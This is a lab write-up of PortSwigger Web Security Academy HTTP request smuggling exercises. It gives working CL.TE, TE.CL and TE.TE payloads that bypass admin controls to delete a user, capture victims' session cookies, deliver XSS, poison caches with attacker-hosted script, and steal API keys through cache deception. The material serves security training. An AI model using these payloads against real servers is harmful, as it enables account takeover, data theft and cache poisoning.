[TOC]

### 0. Knowledges

#### 0.1 How to perform an HTTP request smuggling attack

- **CL.TE**: the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header.

    ```http
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 13
    Transfer-Encoding: chunked
    
    0
    
    SMUGGLED
    ```

- **TE.CL**: the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header.

    ```http
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 3  // 不能让burp自己更改长度
    Transfer-Encoding: chunked
    
    8
    SMUGGLED
    0
    
    
    ```

- **TE.TE**: the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.

    ```
    Transfer-Encoding: xchunked
    
    Transfer-Encoding : chunked
    
    Transfer-Encoding: chunked
    Transfer-Encoding: x
    
    Transfer-Encoding: chunked
    Transfer-encoding: x
    
    Transfer-Encoding:[tab]chunked
    
    [space]Transfer-Encoding: chunked
    
    X: X[\n]Transfer-Encoding: chunked
    
    Transfer-Encoding
    : chunked
    ```

#### 0.2 Finding HTTP request smuggling vulnerabilities

* **using timing techniques**

    * **CL.TE**

        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Transfer-Encoding: chunked
        Content-Length: 4
        
        1
        A
        X
        ```

        当前端用`Content-Length`的时候，`X`会被丢弃，然后后端用`Transfer-Encoding`，读了`A`之后没有发现结束，会继续等待。

    * **TE.CL**

        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Transfer-Encoding: chunked
        Content-Length: 6
        
        0
        
        X
        ```

        分析和上面类似。

* **differential responses**

    * **CL.TE**

        ```http
        POST /search HTTP/1.1
        Host: vulnerable-website.com
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 49
        Transfer-Encoding: chunked
        
        e
        q=smuggling&x=
        0
        
        GET /404 HTTP/1.1
        Foo: x
        ```

        这里的`GET`以及后面的内容在前端被搁置。

    * **TE.CL**

        ```http
        POST /search HTTP/1.1
        Host: vulnerable-website.com
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 4
        Transfer-Encoding: chunked
        
        7c
        GET /404 HTTP/1.1
        Host: vulnerable-website.com
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 144
        
        x=
        0
        
        
        ```
        
        前端全部传送，后端在`7c`处截断。

#### 0.3 Exploiting HTTP request smuggling vulnerabilities

* 绕过前端安全控制

    ```http
    POST /home HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 62
    Transfer-Encoding: chunked
    
    0
    
    GET /admin HTTP/1.1
    Host: vulnerable-website.com
    Foo: xGET /home HTTP/1.1
    Host: vulnerable-website.com
    ```

    这样前端能看到两个`/home`请求（第一个第三个），然后后端能看到一个`/home`，以及一个`/admin`。

* 识别前端改写请求

    * 请求更改形式：
        * 终止TLS连接，并添加一些描述所使用的协议和密码的头信息
        * 增加一个包含用户IP地址的`X-Forwarded-For`头。
        * 根据用户的session token确定用户的ID，并添加一个识别用户的头。
        * add some sensitive information that is of interest for other attacks.
    * 找出前端服务器如何重写请求
        1. 找到一个POST请求，将请求参数的值反映到应用程序的响应中。
        2. 对参数进行洗牌，使反映的参数在消息体中最后出现。
        3. 将这个请求偷渡到后端服务器，后面直接跟着一个正常的请求，你要揭示其重写的形式。

    * 如发送下面这个请求。

        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 130
        Transfer-Encoding: chunked
        
        0
        
        POST /login HTTP/1.1
        Host: vulnerable-website.com
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 100
        
        email=POST /login HTTP/1.1
        Host: vulnerable-website.com
        ...
        ```

        返回到网页上就变成：

        ```html
        <input id="email" value="POST /login HTTP/1.1
        Host: vulnerable-website.com
        X-Forwarded-For: 1.3.3.7
        X-Forwarded-Proto: https
        X-TLS-Bits: 128
        X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
        X-TLS-Version: TLSv1.2
        x-nr-external-service: external
        ...
        ```

* 捕捉其他用户的请求

    ```http
  GET / HTTP/1.1
  Host: vulnerable-website.com
  Transfer-Encoding: chunked
  Content-Length: 324
  
  0
  
  POST /post/comment HTTP/1.1
  Host: vulnerable-website.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 400
  Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
  
  csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
    ```
  
  其实就是用上一个走私去包含下一个请求。

* 执行XSS攻击。

    ```http
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 63
    Transfer-Encoding: chunked
    
    0
    
    GET / HTTP/1.1
    User-Agent: <script>alert(1)</script>
    Foo: X
    ```

* 将`on-site`重定向改成`open`重定向

    有些服务器会将末尾没有反斜杠的请求重定向到`Host+URL/`。

    ```http
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 54
    Transfer-Encoding: chunked
    
    0
    
    GET /home HTTP/1.1
    Host: attacker-website.com
    Foo: X
    ```

    这就会被重定向到`https://attacker-website.com/home/`。

* 污染缓存

    ```http
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 59
    Transfer-Encoding: chunked
    
    0
    
    GET /home HTTP/1.1
    Host: attacker-website.com
    Foo: XGET /static/include.js HTTP/1.1
    Host: vulnerable-website.com
    ```

* 网络缓存欺骗

    ```http
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 43
    Transfer-Encoding: chunked
    
    0
    
    GET /private/messages HTTP/1.1
    Foo: X
    ```

    走私之后（这个是在受害者的会话下进行的）：

    ```http
    GET /private/messages HTTP/1.1
    Foo: XGET /static/some-image.png HTTP/1.1
    Host: vulnerable-website.com
    Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z
    ...
    ```

    后台服务器以正常的方式响应这个请求。请求中的URL是针对用户的私信，并且该请求是在受害者用户会话的上下文中处理的。前端服务器将此响应与它认为的第二个请求中的URL进行缓存，这个`URL`是`/static/some-image.png`。

### 1. HTTP request smuggling, basic CL.TE vulnerability

> To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.

这个挺简单的，就是加上`Transfer-Encoding: chunked`，让后端用这个进行解析。

当读到0的时候就结束了，后面加上标头。

我一开始最后只打了一个空行，一直不行，估计是把后面的`GET`请求加上了。

最后连续打了三个空行，就过了。

```http
POST /post/comment HTTP/1.1
Host: acfb1fff1fec7dc080e2256c005b00a0.web-security-academy.net
Connection: close
Cookie: session=ttdVklYoSFmf0FJjnW6LvMQi0MePFZSM
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Transfer-Encoding: chunked

0

GPOST /post/comment HTTP/1.1



```

官方的paylaod最后只有一个`G`，想的是用`G`加上后面的`POST`去凑出`GPOST`。

### 2. HTTP request smuggling, basic TE.CL vulnerability

> To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.

直接上payload:

```http
POST /post/comment HTTP/1.1
Host: ac8f1f9a1f601a6f80e6035e0004004c.web-security-academy.net
Connection: close
Content-Length: 4 /* 10进制 */
Content-Type: application/x-www-form-urlencoded
Cookie: session=ovzJvUNqsXyuecb7R0vM91Ms2eCDiV5t
Transfer-Encoding: chunked

15 /* 16进制 */
GPOST / HTTP/1.1

x
0


```

这里的那个`15`我算了好久，计算规则（一次一次试出来的）：

* 结果是16进制。
* `15`之后的那个回车不用算，从下一行开始算。
* 每个字符都算`1`（空格也要算进去）。
* 回车算两个字符（`\r\n`）。
* `x`后面的回车不用算，`x`主要是拿来占位，为了好算，也好看到底结束的地方在哪里。（不用x也行，相应结果减1。）

计算`Content-Length`:

* 结果为10进制，全部计算

* 计算方法和上面一样

然后我一开始没有那个`x`，我是直接：

```
10
GPOST / HTTP/1.1
0


```

虽然和上面我的payload一样，都是返回的`"Missing parameter 'csrf'"`，但是不给过，有点离谱。

### 3. HTTP request smuggling, obfuscating the TE header

```http
POST /post/comment HTTP/1.1
Host: aca41f7e1f75e03b80924e95007300b3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: x

0

GPOST / HTTP/1.1

```

第二次发送这个，他返回了`"Unrecognized method 0POST"`

`0POST`？为什么会是这个。

仔细思考了一下，应该是到前端的时候，默认用前面那个，就是`Transfer-Encoding: chunked`，于是这个时候到`0`就截止了，`GPOST / HTTP/1.1`被丢弃。

后端默认用的是后面那个，`Transfer-Encoding: x`，认不出来是啥，也就是不会再去检测后面的内容，`0`也就被放到了下面的一个报文，此时`GPOST / HTTP/1.1`已被丢弃，所以直接后面接的就是下一个报文的`POST`，组合起来就是`0POST`。

根据这个思路，修改报文，但是经过几次尝试之后，发现那个数字都会跟着`GPOST`一起，想办法让后端将数字读走，这里用`Content-length`，前端默认`Transfer-Encoding`，后端在`Transfer-Encoding`出错的情况下，会使用`Content-length`。

```http
POST /post/comment HTTP/1.1
Host: aca41f7e1f75e03b80924e95007300b3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: x
Content-Length: 4

14
GPOST / HTTP/1.1


0

```

### 4. HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

> 前端不支持chunked encoding

​```http
POST /post/comment HTTP/1.1
Host: ac351fda1f7fe0e180755baf00b4002f.web-security-academy.net
Content-Length: 30
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

多发几次，两个Repeater一起发。

### 5. HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

> back-end server doesn't support chunked encoding

```http
POST /post/comment HTTP/1.1
Host: accc1ffa1f6baad9809405ed00dd0055.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

9e
GET /404 HTTP/1.1
Host: accc1ffa1f6baad9809405ed00dd0055.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0


```

我这里已经出现`"Not Found"`了，可是不给过。

和答案一个一个对照和测试，发现`POST /post/comment HTTP/1.1`改成`POST / HTTP/1.1`就给过了。

题目要求的是：`To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.`

对不起，我是瞎子。

### 6. Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

> the front-end server doesn't support chunked encoding.

我先用这个

```http
POST /login HTTP/1.1
Host: acaf1f781f41c7b181735f0a007e00f5.web-security-academy.net
Content-Length: 93
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: acaf1f781f41c7b181735f0a007e00f5.web-security-academy.net


```

返回`401 Unauthorized`，纳闷，有点奇怪。

去看了一下官方的解析，发现后端处理`/admin`的请求时，需要将`Host: localhost`。

然后倒回去看了一下返回的东西，发现`Admin interface only available to local users`，眼瞎竟是我自己。

我换了之后发现还是不行。。。。我又卡住了。

多试了一下：

```http
POST /login HTTP/1.1
Host: acaf1f781f41c7b181735f0a007e00f5.web-security-academy.net
Content-Length: 45
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /login HTTP/1.1
Host: localhost


```

我发现这个能进`/admin`，好神奇啊。把`GET /login HTTP/1.1`改成`GET / HTTP/1.1`也能进`/admin`。

神奇。

然后现在就是进`/admin/delete?username=carlos`来删除账户了。

直接：

```http
POST /login HTTP/1.1
Host: acaf1f781f41c7b181735f0a007e00f5.web-security-academy.net
Content-Length: 68
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost


```

可以了。

倒回去看一眼官方的解析，因为我觉得我那个用`/`和`/login`进去就很离谱。

官方进的是`/admin`，果然。

官方说的是第二个请求的`Host`和第一个走私的`Host`冲突（两个请求是拼在一起的）。

那我尝试将第二个请求的`Host`删掉。把第二个的`Host`删除之后，发现过不了前端了。

那还是用官方的方法，把第二个请求当成第一个请求的请求头。

```http
POST /login HTTP/1.1
Host: acaf1f781f41c7b181735f0a007e00f5.web-security-academy.net
Content-Length: 69
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

POST /admin HTTP/1.1
Host: localhost
Content-Length: 111

x=
```

### 7. Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

这下漏洞是TE.CL。还是要删除carlos。

吸取上一题的教训，这次用上了`localhost`，并且避免了`Host`冲突。

```http
POST /login HTTP/1.1
Host: ac441f131eb46bf180d01c2800da00dd.web-security-academy.net
Content-Length: 4
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

3f
POST /admin HTTP/1.1
Host: localhost
Content-Length: 111

x
0


```

后面就是正常的删除账号。

我一开始还用了这个

```http
POST /login HTTP/1.1
Host: ac441f131eb46bf180d01c2800da00dd.web-security-academy.net
Content-Length: 4
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

2a
GET /admin HTTP/1.1
Host: localhost
x: x


0


```

发现不能过。应该是后端错误，那个0就很突兀，应该直接报文格式错误，然后报错了。

现在尝试这个：

```http
POST /login HTTP/1.1
Host: ac441f131eb46bf180d01c2800da00dd.web-security-academy.net
Content-Length: 4
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

29
GET /admin HTTP/1.1
Host: localhost

x
0


```

发现直接就可以进去了。

### 8. Exploiting HTTP request smuggling to reveal front-end request rewriting

> 漏洞：CL.TE，前端服务器会添加一个包含ip地址的请求头。
>
> 要求：用`127.0.0.1`访问`/admin`，删除carlos账户。

我一开始想的是：

```http
POST / HTTP/1.1
Host: acd31f5e1ecfd83d80f9160800050068.web-security-academy.net
Content-Length: 10
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

5c
search=POST / HTTP/1.1
Host: acd31f5e1ecfd83d80f9160800050068.web-security-academy.net

x
0


```

我一开始想的是用这种东西，前端服务器在`search=`这里拦截下来，然后对后面的`POST`请求添加头。

可万万没想到它不添加头了（因为只有`5c`过了）。猜测应该是一次发送只会添加一次头。

然后我就尝试了一下这个报文：

```http
POST / HTTP/1.1
Host: acd31f5e1ecfd83d80f9160800050068.web-security-academy.net
Content-Length: 110
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

a
search=aaa
0


GET /login HTTP/1.1
Host: acd31f5e1ecfd83d80f9160800050068.web-security-academy.net


```

发现它成功返回了`/login`页面。

然后尝试在`Host`这里加上`127.0.0.1`，去访问`/admin`，发现不行，后端不认。

我还是得去找到那个头是什么。

既然这个只添加一次，那么我就用上一个走私去包含下一个请求。

```http
POST / HTTP/1.1
Host: acd31f5e1ecfd83d80f9160800050068.web-security-academy.net
Content-Length: 121
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Host: acd31f5e1ecfd83d80f9160800050068.web-security-academy.net
Content-Length: 100

search=
```

发现返回了`X-wwQeBD-Ip: xxxx`，那我接下来直接就访问`/admin`。

```http
POST / HTTP/1.1
Host: acd31f5e1ecfd83d80f9160800050068.web-security-academy.net
Content-Length: 54
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0


GET /admin HTTP/1.1
X-wwQeBD-Ip: 127.0.0.1


```

接下来就是删除carlos。

用上面的那个去访问`/admin/delete?username=carlos`就行。

### 9. Exploiting HTTP request smuggling to capture other users' requests

> 漏洞：CL.TE

payload:

```http
POST /post/comment HTTP/1.1
Host: ac891f051f9cabbd80980af40037004a.web-security-academy.net
Content-Length: 310
Content-Type: application/x-www-form-urlencoded
Cookie: session=5C7vijjjuUPQlVDaydpmAVtUfSgRPjMh
Transfer-Encoding: chunked

0


POST /post/comment HTTP/1.1
Host: ac891f051f9cabbd80980af40037004a.web-security-academy.net
Content-Length: 640
Content-Type: application/x-www-form-urlencoded
Cookie: session=5C7vijjjuUPQlVDaydpmAVtUfSgRPjMh

csrf=WasSfCz2sRoMbBg5DKFZoQnw4SEnqsZA&postId=1&name=a&email=a%40a&website=&comment=


```

这个间隔要长一点（亿点点），特别是还要去试字数，需要多试几（亿）次。

我做了两个小时之后，发现除了用时间去等待以外，你每发三个POST请求，系统就会加一个受害者的请求，也就是说...我白等这么久了。

得到了cookie。

```http
GET / HTTP/1.1
Host: ac891f051f9cabbd80980af40037004a.web-security-academy.net
Connection: keep-alive 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1 
User-Agent: Chrome/153485 
Accept: text/html,application/xhtmlxml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US
Cookie: victim-fingerprint=GSZWTj4SnRVusMXXuoy7JGnlycfWzZhK; secret=dCdol6xnT5Fue3BlC8F0BTZiKMK9DEFo; session=FspfqxF6kxvLM0NARpi85CVimSqQdJYP


```

### 10. Exploiting HTTP request smuggling to deliver reflected XSS

这个题目在User-Agent那里存在xss。

先找到注入点：

```http
GET /post?postId=9 HTTP/1.1
Host: acd81f821e43803780ad1d56009d00a2.web-security-academy.net
User-Agent: a"><script>alert(1)</script>
```

构造payload：

```http
POST /post/comment HTTP/1.1
Host: acd81f821e43803780ad1d56009d00a2.web-security-academy.net
Content-Length: 143
Transfer-Encoding: chunked

0

GET /post?postId=9 HTTP/1.1
Host: acd81f821e43803780ad1d56009d00a2.web-security-academy.net
User-Agent: a"><script>alert(1)</script>


```

### 11. Exploiting HTTP request smuggling to perform web cache poisoning

> 漏洞： CL.TE

```http
POST /post/comment HTTP/1.1
Host: ac3d1f301edd1c2a80181dc100e0000c.web-security-academy.net
Content-Length: 124
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /post/next?postId=2 HTTP/1.1
Host: ace41fb41e6b1c0980771de2012f00b9.web-security-academy.net
Connection: close


```

发现这个可以重定向：`Location: https://ace41fb41e6b1c0980771de2012f00b9.web-security-academy.net/post?postId=3`

在`Exploit Server`的body那里加上`alert(document.cookie);`，并将名字改成`/post`。

然后我用这个：

```http
POST /post/comment HTTP/1.1
Host: ac3d1f301edd1c2a80181dc100e0000c.web-security-academy.net
Content-Length: 178
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /post/next?postId=2 HTTP/1.1
Host: ace41fb41e6b1c0980771de2012f00b9.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

去修改缓存，之后用下面这个去修改缓存。

```http
GET /resources/js/tracking.js HTTP/1.1
Host: ac3d1f301edd1c2a80181dc100e0000c.web-security-academy.net
Connection: close


```

每个EXP一次。

### 12. Exploiting HTTP request smuggling to perform web cache deception

> 前端服务器不支持分块编码(CL.TE)。前端服务器正在缓存静态资源。
>
> 为了解决本实验室的问题，执行请求走私攻击，使下一个用户的请求导致他们的API密钥被保存在缓存中。然后从缓存中检索受害者用户的API密钥，并将其作为实验室解决方案提交。您需要从访问实验室开始等待30秒，然后再尝试欺骗受害者缓存他们的API密钥。

直接构造payload。

```http
POST /login HTTP/1.1
Host: ac941f6c1f773cc080ee1c58006e009f.web-security-academy.net
Content-Length: 37
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
Foo: x
```

多发几次，然后去访问（大海捞针）静态资源。

至于怎么去找：

* 多发几次，让静态资源被写入。
* 打开无痕浏览器去强制访问？？？？